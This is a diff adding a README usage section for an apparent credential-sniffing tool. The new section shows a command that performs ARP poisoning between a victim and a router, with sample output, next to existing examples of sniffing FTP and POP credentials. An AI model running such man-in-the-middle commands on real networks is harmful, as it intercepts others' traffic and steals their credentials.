@@ -35,6 +35,14 @@ sudo ./main.py -i mon0 -m "ftpCredentials, popCredentials"
         |-Using ftpCredentials
     [*] Start sniffind on mon0
 
+### Use ARP poisoning ( -a victimIp-routerIp ) :
+sudo ./main.py -i eth0 -a 192.168.0.2-192.168.0.1
+
+    [*] Loading modules
+        |-Using all modules
+    [*] Start arp poisoning
+    [*] Start sniffind on eth0
+
 Extend :
 --------
 
